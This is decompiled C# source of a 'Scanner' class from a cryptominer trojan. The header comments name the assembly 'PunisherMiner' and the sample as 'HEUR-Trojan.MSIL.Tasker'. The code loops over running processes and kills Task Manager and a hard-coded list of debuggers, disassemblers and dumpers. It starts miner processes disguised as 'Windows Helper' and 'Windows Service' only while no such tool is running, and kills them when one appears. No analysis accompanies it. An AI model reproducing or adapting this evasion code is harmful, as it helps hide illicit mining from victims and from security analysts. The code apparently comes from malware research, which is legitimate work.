// Decompiled with JetBrains decompiler
// Type: Scanner
// Assembly: PunisherMiner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5E38855F-8014-4FAB-90F8-2AFCCACBC0F6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-a984daf88ca5b95be07c38888abaac8d0f4241cc67b3fc5e8e798a5fed89bc6d.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;

internal class Scanner
{
  private static readonly HashSet<string> BadProcessnameList = new HashSet<string>();
  private static readonly HashSet<string> BadWindowTextList = new HashSet<string>();
  private static readonly HashSet<string> ProgramsnameList = new HashSet<string>();

  public static void Run()
  {
    while (true)
    {
      do
      {
        while (Scanner.Scan(Settings.BlockDispatcher) == 0)
        {
          if (!Scanner.ProgrammProcessesIsRun())
            Starter.Start();
        }
        Thread.Sleep(100);
      }
      while (!Scanner.ProgrammProcessesIsRun());
      Scanner.KillProgrammProcesses();
    }
  }

  private static void KillProgrammProcesses()
  {
    foreach (Process process in Process.GetProcesses())
    {
      if (Scanner.ProgramsnameList.Contains(process.ProcessName))
      {
        try
        {
          process.Kill();
          break;
        }
        catch
        {
          break;
        }
      }
    }
  }

  private static bool ProgrammProcessesIsRun()
  {
    foreach (Process process in Process.GetProcesses())
    {
      if (Scanner.ProgramsnameList.Contains(process.ProcessName))
      {
        try
        {
          return true;
        }
        catch
        {
          break;
        }
      }
    }
    return false;
  }

  private static int Scan(bool KillProcess)
  {
    int num = 0;
    if (Scanner.BadProcessnameList.Count == 0 && Scanner.BadWindowTextList.Count == 0)
      Scanner.Init();
    foreach (Process process in Process.GetProcesses())
    {
      if (Scanner.BadProcessnameList.Contains(process.ProcessName) || Scanner.BadWindowTextList.Contains(process.MainWindowTitle))
      {
        num = 1;
        if (KillProcess)
        {
          try
          {
            process.Kill();
            return num;
          }
          catch
          {
            return num;
          }
        }
        else
          break;
      }
    }
    return num;
  }

  private static int Init()
  {
    if (Scanner.BadProcessnameList.Count > 0 && Scanner.BadWindowTextList.Count > 0)
      return 1;
    Scanner.BadProcessnameList.Add("Taskmgr");
    Scanner.BadProcessnameList.Add("ollydbg");
    Scanner.BadProcessnameList.Add("ida");
    Scanner.BadProcessnameList.Add("ida64");
    Scanner.BadProcessnameList.Add("idag");
    Scanner.BadProcessnameList.Add("idag64");
    Scanner.BadProcessnameList.Add("idaw");
    Scanner.BadProcessnameList.Add("idaw64");
    Scanner.BadProcessnameList.Add("idaq");
    Scanner.BadProcessnameList.Add("idaq64");
    Scanner.BadProcessnameList.Add("idau");
    Scanner.BadProcessnameList.Add("idau64");
    Scanner.BadProcessnameList.Add("scylla");
    Scanner.BadProcessnameList.Add("scylla_x64");
    Scanner.BadProcessnameList.Add("scylla_x86");
    Scanner.BadProcessnameList.Add("protection_id");
    Scanner.BadProcessnameList.Add("x64dbg");
    Scanner.BadProcessnameList.Add("x32dbg");
    Scanner.BadProcessnameList.Add("windbg");
    Scanner.BadProcessnameList.Add("reshacker");
    Scanner.BadProcessnameList.Add("ImportREC");
    Scanner.BadProcessnameList.Add("IMMUNITYDEBUGGER");
    Scanner.BadProcessnameList.Add("MegaDumper");
    Scanner.BadWindowTextList.Add("OLLYDBG");
    Scanner.BadWindowTextList.Add("ida");
    Scanner.BadWindowTextList.Add("disassembly");
    Scanner.BadWindowTextList.Add("scylla");
    Scanner.BadWindowTextList.Add("Debug");
    Scanner.BadWindowTextList.Add("[CPU");
    Scanner.BadWindowTextList.Add("Immunity");
    Scanner.BadWindowTextList.Add("WinDbg");
    Scanner.BadWindowTextList.Add("x32dbg");
    Scanner.BadWindowTextList.Add("x64dbg");
    Scanner.BadWindowTextList.Add("Import reconstructor");
    Scanner.BadWindowTextList.Add("MegaDumper");
    Scanner.BadWindowTextList.Add("MegaDumper 1.0 by CodeCracker / SnD");
    Scanner.BadWindowTextList.Add("Process Hacker [" + Environment.MachineName + "\\" + Environment.UserName + "]");
    Scanner.ProgramsnameList.Add("Windows Helper");
    Scanner.ProgramsnameList.Add("Windows Service");
    Scanner.ProgramsnameList.Add("WindowsFinder");
    return 0;
  }
}
